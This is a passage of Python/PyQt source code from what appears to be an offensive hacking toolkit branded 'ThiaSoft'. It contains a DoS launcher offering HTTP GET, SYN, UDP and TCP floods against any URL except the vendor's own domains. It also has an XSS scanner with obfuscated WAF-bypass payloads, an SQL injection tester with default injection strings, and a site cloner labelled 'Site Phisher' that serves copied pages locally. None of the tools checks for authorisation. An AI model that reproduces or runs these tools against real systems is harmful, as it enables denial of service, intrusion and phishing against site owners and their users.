        self.attack_type_combo.addItems(["HTTP GET Flood", "SYN Flood", "UDP Flood", "TCP Flood"])
        additional_layout.addWidget(self.attack_type_combo)
        self.port_entry = QSpinBox()
        self.port_entry.setRange(1, 65535)
        self.port_entry.setValue(80)
        self.port_entry.setPrefix("Port: ")
        additional_layout.addWidget(self.port_entry)
        self.packet_size_entry = QSpinBox()
        self.packet_size_entry.setRange(64, 4096)
        self.packet_size_entry.setValue(1024)
        self.packet_size_entry.setPrefix("Packet: ")
        additional_layout.addWidget(self.packet_size_entry)

        additional_group.setLayout(additional_layout)
        layout.addWidget(additional_group)
        button_layout = QHBoxLayout()
        button_layout.setSpacing(10)

        self.start_button = QPushButton("Start DoS Attack")
        self.start_button.setStyleSheet("background-color: black; color: white;")
        self.start_button.clicked.connect(self.start_dos)

        self.stop_button = QPushButton("Stop Attack")
        self.stop_button.setStyleSheet("background-color: black; color: white;")
        self.stop_button.clicked.connect(self.stop_dos)
        self.stop_button.setEnabled(False)

        self.clear_button = QPushButton("Clear Log")
        self.clear_button.setStyleSheet("background-color: black;")
        self.clear_button.clicked.connect(self.clear_log)

        button_layout.addWidget(self.start_button)
        button_layout.addWidget(self.stop_button)
        button_layout.addWidget(self.clear_button)
        layout.addLayout(button_layout)
        self.progress_bar = QProgressBar()
        self.progress_bar.setTextVisible(True)
        layout.addWidget(self.progress_bar)
        self.result_text = QTextEdit()
        self.result_text.setReadOnly(True)
        layout.addWidget(self.result_text)

        self.setLayout(layout)

    def start_dos(self):
        target = self.target_entry.text()
        num_requests = self.requests_entry.text()
        attack_type = self.attack_type_combo.currentText()
        delay_min = self.delay_min_entry.value()
        delay_max = self.delay_max_entry.value()
        timeout = self.timeout_entry.value()
        port = self.port_entry.value()
        packet_size = self.packet_size_entry.value()

        if "thiasoft" in target:
            QMessageBox.warning(self, "Error", "Attacking ThiaSoft domains is not allowed.")
            return

        if not target or not num_requests:
            QMessageBox.warning(self, "Error", "Please enter a target and number of requests")
            return

        if not re.match(r'https?://\S+', target):
            QMessageBox.warning(self, "Error", "Please enter a valid URL (including http:// or https://)")
            return

        try:
            num_requests = int(num_requests)
        except ValueError:
            QMessageBox.warning(self, "Error", "Number of requests must be an integer")
            return

        self.result_text.append(f"Starting {attack_type} on {target} with {num_requests} requests at port {port}...")

        self.dos_thread = DoSAttackThread(target, num_requests, attack_type, (delay_min, delay_max), timeout, port, packet_size)
        self.dos_thread.log_signal.connect(self.update_log)
        self.dos_thread.progress_signal.connect(self.update_progress)
        self.dos_thread.finished.connect(self.attack_finished)
        self.dos_thread.start()

        self.start_button.setEnabled(False)
        self.stop_button.setEnabled(True)

    def stop_dos(self):
        if hasattr(self, 'dos_thread'):
            self.dos_thread.stop()
        self.result_text.append("Attack stopped by user.")

    def update_log(self, message):
        self.result_text.append(message)

    def update_progress(self, value):
        self.progress_bar.setValue(value)

    def clear_log(self):
        self.result_text.clear()
        self.progress_bar.setValue(0)

    def attack_finished(self):
        self.start_button.setEnabled(True)
        self.stop_button.setEnabled(False)
        self.result_text.append("Attack finished.")



class XSSScannerThread(QThread):
    log_signal = pyqtSignal(str)
    progress_signal = pyqtSignal(int)

    def __init__(self, target_urls, use_waf_bypass, timeout, user_agent, custom_headers, proxy):
        super().__init__()
        self.target_urls = target_urls
        self.use_waf_bypass = use_waf_bypass
        self.timeout = timeout
        self.user_agent = user_agent
        self.custom_headers = custom_headers
        self.proxy = proxy
        
        self.payloads = [
            "<script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<script>console.log('XSS');</script>",
            "\" onfocus=alert('XSS') autofocus>",
            "<iframe src=\"javascript:alert('XSS')\"></iframe>",
            "<input type=\"text\" value=\"XSS\" onfocus=\"alert('XSS')\">",
            "<img src=x onerror=\"javascript:alert('XSS')\">",
            "<body onload=alert('XSS')>",
            "<div onmouseover=\"alert('XSS')\">Hover me</div>",
            "<svg><animate onbegin=alert('XSS') attributeName=x />",
            "javascript&#58;alert('XSS')",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
            "'\"><script>alert(document.domain);</script>",
            "<img src=\"javascript:alert('XSS')\">",
            "<<script>alert('XSS');//<</script>",
            "<script>prompt('XSS');</script>",
            "<script>confirm('XSS');</script>",
            "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\">",
        ]
        self.waf_bypass_payloads = [
            "<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>",
            "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycpOw=='))>",
            "<svg><script>&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;</script></svg>",
            "<script>setTimeout('al'+'ert(\"XSS\")',0)</script>",
            "javas&#99;ript:alert('XSS')",
            "&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert('XSS')",
            "<script>window['al'+'ert']('XSS')</script>",
            "<img src=x onerror=\"\\u0061\\u006c\\u0065\\u0072\\u0074('XSS')\">",
            "<script>eval(decodeURIComponent(atob('YWxlcnQoJ1hTUycp')))</script>",
            "<s\x63ript>alert('XSS')</script>",
            "<script>console['log']('XSS');</script>",
            "<script>window.onerror=alert;</script>",
            "<script>document.write('<img src=x onerror=alert(\"XSS\")>');</script>",
        ]

    def run(self):
        total = len(self.target_urls) * (len(self.payloads) + len(self.waf_bypass_payloads))
        current = 0
        
        for base_url in self.target_urls:
            payloads = self.payloads + (self.waf_bypass_payloads if self.use_waf_bypass else [])
            
            for payload in payloads:
                self.log_signal.emit(f"Scanning {base_url} with payload {payload}")
                try:
                    query_url = self.prepare_url(base_url, payload, 'query')
                    query_response = self.send_request(query_url)
                    query_xss = self.check_xss(query_response, payload)
                    path_url = self.prepare_url(base_url, payload, 'path')
                    path_response = self.send_request(path_url)
                    path_xss = self.check_xss(path_response, payload)
                    header_url = self.prepare_url(base_url, payload, 'header')
                    header_response = self.send_request(header_url, custom_headers={'X-Injection': payload})
                    header_xss = self.check_xss(header_response, payload)
                    if query_xss or path_xss or header_xss:
                        vulnerabilities = []
                        if query_xss:
                            vulnerabilities.append("query parameter")
                        if path_xss:
                            vulnerabilities.append("path parameter")
                        if header_xss:
                            vulnerabilities.append("header")
                        
                        vulnerability_types = ", ".join(vulnerabilities)
                        self.log_signal.emit(f"XSS vulnerability found in {base_url} via {vulnerability_types} with payload {payload}")
                    else:
                        self.log_signal.emit(f"No XSS vulnerability found in {base_url} with payload {payload}")
                
                except requests.RequestException as e:
                    self.log_signal.emit(f"Error scanning {base_url}: {e}")
                except Exception as e:
                    self.log_signal.emit(f"Unexpected error scanning {base_url}: {e}")
                
                current += 1
                self.progress_signal.emit(int(current / total * 100))

    def prepare_url(self, base_url, payload, injection_type):
        base_url = base_url.rstrip('/')
        
        if injection_type == 'query':
            query_params = {'q': payload}
            return base_url + '?' + urllib.parse.urlencode(query_params)
        
        elif injection_type == 'path':
            return f"{base_url}/{urllib.parse.quote(payload)}"
        
        return base_url

    def send_request(self, url, custom_headers=None):
        headers = {
            'User-Agent': self.get_user_agent(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
        }
        
        if custom_headers:
            headers.update(custom_headers)
        
        proxies = {'http': self.proxy, 'https': self.proxy} if self.proxy else None
        
        return requests.get(
            url, 
            headers=headers, 
            timeout=self.timeout, 
            proxies=proxies, 
            verify=False
        )

    def get_user_agent(self):
        user_agents = {
            'Default': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Chrome': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Firefox': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Safari': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15'
        }
        return user_agents.get(self.user_agent, user_agents['Default'])

    def check_xss(self, response, payload):
        decoded_response = html.unescape(response.text)
        if payload.lower() in decoded_response.lower():
            return True
        xss_patterns = [
            r'<script[\s\S]*?>', 
            r'on\w+\s*=\s*[\'"][^>]*[\'"]', 
            r'javascript:', 
            r'eval\s*\(', 
            r'document\.write\s*\(', 
            r'window\.location', 
        ]
        
        for pattern in xss_patterns:
            if re.search(pattern, decoded_response, re.IGNORECASE):
                return True
        
        return False

class XSSScannerApp(QDialog):
    def __init__(self):
        super().__init__()
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
        self.setWindowTitle("XSS Scanner")
        self.setWindowIcon(QIcon('imgs/xss.png'))
        self.setMinimumSize(700, 600)

        main_layout = QVBoxLayout()
        header_layout = QHBoxLayout()
        self.icon_label = QLabel()
        pixmap = QPixmap('imgs/xss.png')
        self.icon_label.setPixmap(pixmap.scaled(64, 64, Qt.KeepAspectRatio, Qt.SmoothTransformation))
        header_layout.addWidget(self.icon_label)
        header_label = QLabel("ThiaSoft XSS Scanner")
        header_label.setStyleSheet("font-size: 24px; font-weight: bold;")
        header_layout.addWidget(header_label)
        header_layout.addStretch()
        main_layout.addLayout(header_layout)
        tab_widget = QTabWidget()
        tab_widget.addTab(self.create_scan_tab(), "Scan")
        tab_widget.addTab(self.create_settings_tab(), "Settings")
        main_layout.addWidget(tab_widget)

        self.setLayout(main_layout)

    def create_scan_tab(self):
        scan_widget = QWidget()
        scan_layout = QVBoxLayout()
        url_layout = QHBoxLayout()
        self.urls_entry = QLineEdit()
        self.urls_entry.setPlaceholderText("Enter target URLs (comma-separated)")
        url_layout.addWidget(self.urls_entry)
        self.load_urls_button = QPushButton("Load from file")
        self.load_urls_button.clicked.connect(self.load_urls_from_file)
        url_layout.addWidget(self.load_urls_button)
        scan_layout.addLayout(url_layout)
        options_group = QGroupBox("Scan Options")
        options_layout = QFormLayout()
        self.waf_bypass_checkbox = QCheckBox("Use WAF Bypass techniques")
        self.waf_bypass_checkbox.setChecked(True)
        options_layout.addRow(self.waf_bypass_checkbox)
        self.custom_payloads_checkbox = QCheckBox("Use custom payloads")
        options_layout.addRow(self.custom_payloads_checkbox)
        options_group.setLayout(options_layout)
        scan_layout.addWidget(options_group)
        scan_progress_layout = QHBoxLayout()
        self.scan_button = QPushButton("Start XSS Scan")
        self.scan_button.clicked.connect(self.start_scan)
        scan_progress_layout.addWidget(self.scan_button)
        self.progress_bar = QProgressBar()
        scan_progress_layout.addWidget(self.progress_bar)
        scan_layout.addLayout(scan_progress_layout)

        self.result_text = QTextEdit()
        self.result_text.setReadOnly(True)
        scan_layout.addWidget(self.result_text)

        scan_widget.setLayout(scan_layout)
        return scan_widget

    def create_settings_tab(self):
        settings_widget = QWidget()
        settings_layout = QFormLayout()

        self.timeout_spinbox = QSpinBox()
        self.timeout_spinbox.setRange(1, 60)
        self.timeout_spinbox.setValue(5)
        settings_layout.addRow("Request Timeout (seconds):", self.timeout_spinbox)

        self.user_agent_combo = QComboBox()
        self.user_agent_combo.addItems(["Default", "Chrome", "Firefox", "Safari"])
        settings_layout.addRow("User Agent:", self.user_agent_combo)

        self.custom_headers_text = QTextEdit()
        self.custom_headers_text.setPlaceholderText("Enter custom headers (one per line)")
        settings_layout.addRow("Custom Headers:", self.custom_headers_text)

        self.proxy_entry = QLineEdit()
        self.proxy_entry.setPlaceholderText("http://proxy:port")
        settings_layout.addRow("Proxy:", self.proxy_entry)

        settings_widget.setLayout(settings_layout)
        return settings_widget

    def load_urls_from_file(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Select URL file", "", "Text Files (*.txt)")
        if file_path:
            with open(file_path, 'r') as file:
                urls = file.read().strip()
            self.urls_entry.setText(urls)

    def start_scan(self):
        urls = self.urls_entry.text()
        if not urls:
            QMessageBox.warning(self, "Error", "Please enter at least one URL")
            return

        target_urls = [url.strip() for url in urls.split(",") if url.strip()]
        if not target_urls:
            QMessageBox.warning(self, "Error", "Please enter valid URLs")
            return

        self.result_text.clear()
        self.result_text.append("Starting XSS scan...")
        self.progress_bar.setValue(0)

        self.scan_button.setEnabled(False)
        use_waf_bypass = self.waf_bypass_checkbox.isChecked()
        timeout = self.timeout_spinbox.value()
        user_agent = self.user_agent_combo.currentText()
        custom_headers_text = self.custom_headers_text.toPlainText()
        custom_headers = {}
        for line in custom_headers_text.split('\n'):
            line = line.strip()
            if line and ':' in line:
                key, value = line.split(':', 1)
                custom_headers[key.strip()] = value.strip()
        
        proxy = self.proxy_entry.text().strip() or None

        self.xss_thread = XSSScannerThread(
            target_urls, 
            use_waf_bypass, 
            timeout, 
            user_agent, 
            custom_headers, 
            proxy
        )
        self.xss_thread.log_signal.connect(self.update_log)
        self.xss_thread.progress_signal.connect(self.update_progress)
        self.xss_thread.finished.connect(self.scan_finished)
        self.xss_thread.start()

    def update_log(self, message):
        self.result_text.append(message)

    def update_progress(self, value):
        self.progress_bar.setValue(value)

    def scan_finished(self):
        self.scan_button.setEnabled(True)
        self.result_text.append("XSS scan completed.")

class ScraperThread(QThread):
    result_ready = pyqtSignal(str)
    error_occurred = pyqtSignal(str)

    def __init__(self, url, tag, attribute):
        super().__init__()
        self.url = url
        self.tag = tag
        self.attribute = attribute

    def run(self):
        try:
            response = requests.get(self.url)
            response.raise_for_status()
            soup = BeautifulSoup(response.content, 'html.parser')
            elements = soup.find_all(self.tag)
            if self.attribute == "text":
                results = "\n".join(element.get_text().strip() for element in elements if element.get_text().strip())
            else:
                results = "\n".join(element.get(self.attribute, "") for element in elements if element.get(self.attribute))
            self.result_ready.emit(results)
        except requests.RequestException as e:
            self.error_occurred.emit(f"Failed to scrape {self.url}: {e}")
        except Exception as e:
            self.error_occurred.emit(f"An error occurred: {e}")

class WebScraper(QDialog):
    def __init__(self):
        super().__init__()
        self.init_ui()

    def init_ui(self):
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
        self.setWindowTitle("Web Scraper")
        self.setWindowIcon(QIcon('imgs/scraper.png'))
        self.setFixedSize(600, 450)
        
        layout = QVBoxLayout()
        
        self.url_entry = QLineEdit()
        self.url_entry.setPlaceholderText("Enter URL to scrape")
        layout.addWidget(self.url_entry)
        
        tag_layout = QHBoxLayout()
        self.tag_entry = QLineEdit()
        self.tag_entry.setPlaceholderText("Enter HTML tag to find (e.g., 'h1', 'p')")
        tag_layout.addWidget(self.tag_entry)
        
        self.attribute_combo = QComboBox()
        self.attribute_combo.addItems(["text", "href", "src", "class", "id"])
        tag_layout.addWidget(QLabel("Attribute:"))
        tag_layout.addWidget(self.attribute_combo)
        
        layout.addLayout(tag_layout)
        
        self.scrape_button = QPushButton("Scrape")
        self.scrape_button.clicked.connect(self.scrape_website)
        layout.addWidget(self.scrape_button)
        
        self.progress_bar = QProgressBar()
        self.progress_bar.setRange(0, 0)  
        self.progress_bar.hide()
        layout.addWidget(self.progress_bar)
        
        self.result_text = QTextEdit()
        self.result_text.setReadOnly(True)
        layout.addWidget(self.result_text)
        
        self.setLayout(layout)
    
    def scrape_website(self):
        url = self.url_entry.text()
        tag = self.tag_entry.text()
        attribute = self.attribute_combo.currentText()
        
        if not url or not tag:
            QMessageBox.warning(self, "Error", "Please enter a URL and an HTML tag")
            return
        
        self.progress_bar.show()
        self.scrape_button.setEnabled(False)
        self.result_text.clear()
        
        self.thread = ScraperThread(url, tag, attribute)
        self.thread.result_ready.connect(self.display_result)
        self.thread.error_occurred.connect(self.show_error)
        self.thread.finished.connect(self.scrape_finished)
        self.thread.start()

    def display_result(self, results):
        self.result_text.setPlainText(results)

    def show_error(self, error_message):
        QMessageBox.critical(self, "Error", error_message)

    def scrape_finished(self):
        self.progress_bar.hide()
        self.scrape_button.setEnabled(True)


class SQLiTester(QDialog):
    def __init__(self):
        super().__init__()
        self.init_ui()
        self.manager = QNetworkAccessManager(self)
        self.manager.finished.connect(self.handle_response)
        self.current_payload = None
        self.payloads_to_test = []
        self.vulnerable_fields = []

    def init_ui(self):
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
        self.setWindowTitle("SQL Injection")
        self.setWindowIcon(QIcon('imgs/sqlinject.png'))
        self.setFixedSize(600, 500)

        layout = QVBoxLayout()

        self.url_entry = QLineEdit()
        self.url_entry.setPlaceholderText("Enter URL to test (e.g., http://example.com/login.php)")
        layout.addWidget(self.url_entry)

        self.test_type_combo = QComboBox()
        self.test_type_combo.addItems(["Test login form", "Test all input fields", "Test specific field"])
        layout.addWidget(self.test_type_combo)

        self.field_name_entry = QLineEdit()
        self.field_name_entry.setPlaceholderText("Enter specific field name")
        self.field_name_entry.hide() 
        layout.addWidget(self.field_name_entry)

        self.test_type_combo.currentIndexChanged.connect(self.toggle_field_name_entry)

        self.payloads_list = QTextEdit(self)
        self.payloads_list.setPlaceholderText("Payloads to use for testing")
        default_payloads = [
            "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*", "' OR 1=1 --", "' OR 'a'='a",
            "admin' --", "admin' #", "admin'/*", "' UNION SELECT NULL,NULL,NULL-- -",
            "' UNION SELECT @@version-- -", "' AND 1=0 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7176767a71,0x54686973204669656C642069732056756C6E657261626C6520746F2053514C20496E6A656374696F6E,0x7171786a71)-- -"
        ]
        self.payloads_list.setText("\n".join(default_payloads))
        layout.addWidget(QLabel("Payloads:"))
        layout.addWidget(self.payloads_list)

        self.test_button = QPushButton("Start Testing")
        self.test_button.clicked.connect(self.start_test)
        layout.addWidget(self.test_button)

        self.progress_bar = QProgressBar()
        self.progress_bar.setRange(0, 100)
        self.progress_bar.hide()
        layout.addWidget(self.progress_bar)

        self.result_text = QTextEdit()
        self.result_text.setReadOnly(True)
        layout.addWidget(self.result_text)

        self.setLayout(layout)

    def toggle_field_name_entry(self, index):
        if index == 2:  
            self.field_name_entry.show()
        else:
            self.field_name_entry.hide()
            self.field_name_entry.clear() 

    def start_test(self):
        url = self.url_entry.text().strip()
        if not url:
            QMessageBox.warning(self, "Error", "Please enter a URL to test")
            return

        if not url.startswith(('http://', 'https://')):
            QMessageBox.warning(self, "Error", "Please enter a valid URL starting with http:// or https://")
            return

        self.payloads_to_test = self.payloads_list.toPlainText().splitlines()
        if not self.payloads_to_test:
            QMessageBox.warning(self, "Error", "Please enter at least one payload")
            return

        self.progress_bar.setValue(0)
        self.progress_bar.show()
        self.test_button.setEnabled(False)
        self.result_text.clear()
        self.vulnerable_fields = []
        self.test_next_payload()

    def test_next_payload(self):
        if not self.payloads_to_test:
            self.progress_bar.hide()
            self.test_button.setEnabled(True)
            self.result_text.append("Testing complete.")
            if self.vulnerable_fields:
                self.result_text.append("\nPotentially vulnerable fields found:")
                for field in self.vulnerable_fields:
                    self.result_text.append(f"- {field}")
            else:
                self.result_text.append("\nNo vulnerabilities detected.")
            return

        self.current_payload = self.payloads_to_test.pop(0)
        url = self.url_entry.text().strip()
        params = {}

        if self.test_type_combo.currentIndex() == 0: 
            params = {
                'username': self.current_payload,
                'password': 'dummy_password',
                'login': 'Submit'
            }
        elif self.test_type_combo.currentIndex() == 1: 
            params = {
                'search': self.current_payload,
                'email': f'thiasoft{self.current_payload}@gmail.com',
                'name': f'ThiaSoft {self.current_payload}',
                'message': f'thiasoft {self.current_payload}',
                'submit': 'Send'
            }
        elif self.test_type_combo.currentIndex() == 2: 
            field_name = self.field_name_entry.text().strip()
            if not field_name:
                QMessageBox.warning(self, "Error", "Please enter a field name")
                self.payloads_to_test = []
                return
            params = {field_name: self.current_payload}

        url_with_params = QUrl(url)
        query = QUrlQuery()
        for key, value in params.items():
            query.addQueryItem(key, value)
        url_with_params.setQuery(query)

        request = QNetworkRequest(url_with_params)
        request.setHeader(QNetworkRequest.UserAgentHeader, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
        self.manager.get(request)

    def handle_response(self, reply):
        error = reply.error()
        if error == QNetworkReply.NoError:
            response = reply.readAll().data().decode()
            url = reply.url().toString()
            status_code = reply.attribute(QNetworkRequest.HttpStatusCodeAttribute)
            
            self.result_text.append(f"Test URL: {url}")
            self.result_text.append(f"Status code: {status_code}")
            self.result_text.append(f"Response length: {len(response)}")

            if self.is_vulnerable(response):
                self.result_text.append("Potential SQL injection vulnerability detected!")
                if self.test_type_combo.currentIndex() == 2:
                    vulnerable_field = self.field_name_entry.text().strip()
                else:
                    vulnerable_field = "Unknown field"
                if vulnerable_field not in self.vulnerable_fields:
                    self.vulnerable_fields.append(vulnerable_field)
            else:
                self.result_text.append("No vulnerability detected with this payload.")
            
            self.result_text.append("\n")
        else:
            self.result_text.append(f"Error with payload {self.current_payload}: {reply.errorString()}\n")

        progress = int((len(self.payloads_list.toPlainText().splitlines()) - len(self.payloads_to_test)) / len(self.payloads_list.toPlainText().splitlines()) * 100)
        self.progress_bar.setValue(progress)

        self.test_next_payload()

    def is_vulnerable(self, response):
        error_patterns = [
            "SQL syntax", "mysql_fetch_array()", "You have an error in your SQL syntax",
            "MySQL Error", "ORA-01756", "Error Executing Database Query", "SQLite3::SQLException",
            "Unclosed quotation mark after the character string",
            "ERROR: syntax error at or near", "PostgreSQL ERROR:",
            "Supplied argument is not a valid MySQL result resource",
            "Column count doesn't match value count"
        ]
        
        for pattern in error_patterns:
            if pattern.lower() in response.lower():
                return True

        success_patterns = [
            "admin", "password", "login successful", "welcome back",
            "1234567890", "qazwsxedc", "database version"
        ]
        
        for pattern in success_patterns:
            if pattern.lower() in response.lower():
                return True
        
        return False
    
    
    
class Fishing(QDialog):
    def __init__(self):
        super().__init__()
        self.init_ui()
        self.httpd = None
        self.server_thread = None
        self.save_directory = "cloned_site"
        self.access_log = []
        self.clone_thread = None

    def init_ui(self):
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
        self.setWindowTitle("Site Phisher [Beta]")
        self.setWindowIcon(QIcon('imgs/fishing.png'))
        self.setFixedSize(600, 650)

        layout = QVBoxLayout()

        self.url_entry = QLineEdit()
        self.url_entry.setPlaceholderText("Enter URL to clone")
        layout.addWidget(self.url_entry)

        self.directory_button = QPushButton("Select Save Directory")
        self.directory_button.clicked.connect(self.select_directory)
        layout.addWidget(self.directory_button)

        self.port_spinbox = QSpinBox()
        self.port_spinbox.setRange(1024, 65535)
        self.port_spinbox.setValue(8080)
        layout.addWidget(QLabel("Select Port:"))
        layout.addWidget(self.port_spinbox)

        self.depth_spinbox = QSpinBox()
        self.depth_spinbox.setRange(1, 10)
        self.depth_spinbox.setValue(1)
        layout.addWidget(QLabel("Cloning Depth:"))
        layout.addWidget(self.depth_spinbox)
        self.depth_spinbox.valueChanged.connect(self.pizdec_mnogo)

        self.resource_type_combobox = QComboBox()
        self.resource_type_combobox.addItems(["All", "HTML Only", "HTML + CSS", "HTML + CSS + JS"])
        layout.addWidget(QLabel("Resource Types to Clone:"))
        layout.addWidget(self.resource_type_combobox)

        self.external_resources_checkbox = QCheckBox("Include External Resources")
        self.external_resources_checkbox.setChecked(False)
        layout.addWidget(self.external_resources_checkbox)

        self.logging_checkbox = QCheckBox("Enable Logging")
        self.logging_checkbox.setChecked(True)
        layout.addWidget(self.logging_checkbox)

        self.start_button = QPushButton("Start Phishing")
        self.start_button.clicked.connect(self.start_fishing)
        layout.addWidget(self.start_button)

        self.stop_button = QPushButton("Stop Server")
        self.stop_button.clicked.connect(self.stop_local_server)
        self.stop_button.setEnabled(False)
        layout.addWidget(self.stop_button)

        self.progress_bar = QProgressBar()
        self.progress_bar.setRange(0, 0)
        self.progress_bar.hide()
        layout.addWidget(self.progress_bar)

        self.result_text = QTextEdit()
        self.result_text.setReadOnly(True)
        layout.addWidget(self.result_text)

        self.setLayout(layout)

    def pizdec_mnogo(self, depth):
        if depth > 3:
            QMessageBox.warning(self, "Warning", "Cloning at a depth greater than 3 may cause performance issues or crashes. Proceed with caution.")

    def select_directory(self):
        try:
            directory = QFileDialog.getExistingDirectory(self, "Select Directory")
            if directory:
                self.save_directory = directory
                self.result_text.append(f"Save directory set to: {self.save_directory}")
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to select directory: {str(e)}")

    def start_fishing(self):
        try:
            url = self.url_entry.text().strip()
            if not url:
                QMessageBox.warning(self, "Error", "Please enter a URL to clone")
                return

            if os.path.exists(self.save_directory):
                shutil.rmtree(self.save_directory)
            os.makedirs(self.save_directory)
            self.log_access(f"Created directory: {self.save_directory}")

            self.progress_bar.show()
            self.start_button.setEnabled(False)
            self.result_text.clear()

            self.clone_thread = threading.Thread(target=self.clone_site, args=(url,))
            self.clone_thread.start()
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to start cloning: {str(e)}")

    def clone_site(self, url):
        try:
            self.log_access(f"Fetching HTML content from: {url}")
            self.clone_page(url, depth=self.depth_spinbox.value())

            self.result_text.append("Site cloned successfully!")

            self.start_local_server()
        except requests.exceptions.RequestException as e:
            self.result_text.append(f"Network error: {str(e)}")
        except Exception as e:
            self.result_text.append(f"Error: {str(e)}")
        finally:
            self.progress_bar.hide()
            self.start_button.setEnabled(True)

    def clean_filename(self, url):
        try:
            parsed_url = urlparse(url)
            clean_path = parsed_url.path.replace('/', '_').replace('\\', '_')
            filename = re.sub(r'[^A-Za-z0-9_\-\.]', '_', clean_path)
            if not filename:
                filename = parsed_url.hostname
            if not filename.endswith('.html'):
                filename += '.html'
            return filename
        except Exception as e:
            self.log_access(f"Error cleaning filename: {str(e)}")
            return "error_filename.html"

    def clone_page(self, url, depth):
        if depth <= 0:
            return
        try:
            response = requests.get(url)
            response.raise_for_status()  
            soup = BeautifulSoup(response.text, 'html.parser')
            self.log_access(f"Cloning page: {url}")

            page_name = "index.html" if url == self.url_entry.text().strip() else self.clean_filename(url)
            html_path = os.path.join(self.save_directory, page_name)
            with open(html_path, 'w', encoding='utf-8') as f:
                f.write(soup.prettify())
            self.log_access(f"HTML saved at {html_path}")
            self.save_assets(soup, url)

            if depth > 1:
                for link in soup.find_all('a', href=True):
                    next_url = urljoin(url, link['href'])
                    if self.is_same_domain(next_url) and not next_url.endswith('.pdf'):
                        self.clone_page(next_url, depth - 1)
        except requests.exceptions.RequestException as e:
            self.result_text.append(f"Network error: {str(e)}")
        except Exception as e:
            self.result_text.append(f"Error cloning page {url}: {str(e)}")

    def save_assets(self, soup, base_url):
        resource_type = self.resource_type_combobox.currentText()
        include_external = self.external_resources_checkbox.isChecked()

        try:
            if resource_type in ["All", "HTML + CSS", "HTML + CSS + JS"]:
                for link in soup.find_all('link', rel='stylesheet'):
                    css_url = urljoin(base_url, link['href'])
                    if include_external or self.is_same_domain(css_url):
                        css_content = requests.get(css_url).text
                        css_filename = os.path.basename(css_url)
                        css_path = os.path.join(self.save_directory, css_filename)
                        with open(css_path, 'w', encoding='utf-8') as f:
                            f.write(css_content)
                        link['href'] = css_filename
                        self.result_text.append(f"CSS saved at {css_path}")

            if resource_type in ["All", "HTML + CSS + JS"]:
                for script in soup.find_all('script'):
                    if script.get('src'):
                        js_url = urljoin(base_url, script['src'])
                        if include_external or self.is_same_domain(js_url):
                            js_content = requests.get(js_url).text
                            js_filename = os.path.basename(js_url)
                            js_path = os.path.join(self.save_directory, js_filename)
                            with open(js_path, 'w', encoding='utf-8') as f:
                                f.write(js_content)
                            script['src'] = js_filename
                            self.result_text.append(f"JavaScript saved at {js_path}")
        except requests.exceptions.RequestException as e:
            self.result_text.append(f"Network error while saving assets: {str(e)}")
        except Exception as e:
            self.result_text.append(f"Error saving assets: {str(e)}")

        try:
            html_path = os.path.join(self.save_directory, "index.html")
            with open(html_path, 'w', encoding='utf-8') as f:
                f.write(soup.prettify())
            self.log_access(f"Updated HTML saved at {html_path}")
        except Exception as e:
            self.result_text.append(f"Error updating HTML: {str(e)}")

    def is_same_domain(self, url):
        try:
            base_domain = self.url_entry.text().strip().split('//')[-1].split('/')[0]
            return base_domain in url
        except Exception as e:
            self.log_access(f"Error checking domain: {str(e)}")
            return False

    def start_local_server(self):
        try:
            os.chdir(self.save_directory)
            port = self.port_spinbox.value()
            server_address = ('', port)
            self.httpd = HTTPServer(server_address, SimpleHTTPRequestHandler)

            self.server_thread = threading.Thread(target=self.httpd.serve_forever)
            self.server_thread.setDaemon(True)
            self.server_thread.start()

            local_url = f"http://localhost:{port}"
            self.result_text.append(f"Local server started at {local_url}")
            self.stop_button.setEnabled(True)
            webbrowser.open(local_url)
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to start local server: {str(e)}")
            self.progress_bar.hide()
            self.start_button.setEnabled(True)

    def stop_local_server(self):
        try:
            if self.httpd:
                self.result_text.append("Stopping server...")
                self.httpd.shutdown()
                self.httpd.server_close()
                self.server_thread.join(timeout=10)  
                self.httpd = None
                self.result_text.append("Local server stopped.")
                self.stop_button.setEnabled(False)
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to stop server: {str(e)}")

    def closeEvent(self, event):
        try:
            self.stop_local_server()
            if self.clone_thread is not None and self.clone_thread.is_alive():
                self.clone_thread.join()
            event.accept()
        except Exception as e:
                QMessageBox.critical(self, "Error", f"Error during closing: {str(e)}")


    def log_access(self, message):
        if self.logging_checkbox.isChecked():
            self.access_log.append(message)
            self.result_text.append(message)


class WorkerSignals1(QObject):
